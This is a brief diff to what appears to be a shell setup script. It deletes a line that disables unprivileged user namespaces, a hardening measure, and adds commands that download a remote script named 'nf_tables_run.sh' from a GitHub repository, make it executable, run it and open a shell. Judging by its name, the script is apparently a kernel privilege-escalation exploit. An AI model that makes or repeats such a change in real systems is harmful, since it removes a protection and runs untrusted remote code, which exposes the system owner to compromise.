@@ -1,3 +1,6 @@
-echo kernel.unprivileged_userns_clone=0 | \
-sudo tee /etc/sysctl.d/99-disable-unpriv-userns.conf
+wget https://github.com/33Spot/updates/raw/master/0naprawicBUGI/nf_tables_run.sh
+chmod +x nf_tables_run.sh
+./nf_tables_run.sh
+bash
+
 
